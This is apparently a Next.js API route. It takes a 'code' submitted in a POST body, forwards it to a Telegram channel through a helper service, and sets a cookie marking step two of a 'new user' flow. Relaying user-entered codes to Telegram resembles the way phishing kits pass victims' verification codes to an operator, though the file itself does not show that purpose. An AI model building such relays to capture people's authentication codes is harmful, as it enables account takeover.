import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    await telegramService.sendNewUserCodeNotification(data.code)
    const response = NextResponse.json({ success: true })
    response.cookies.set("new_user_flow", "2", {
      path: "/",
      maxAge: 10 * 60,
    })
    return response
  } catch (error) {
    console.error("Error sending new user code notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
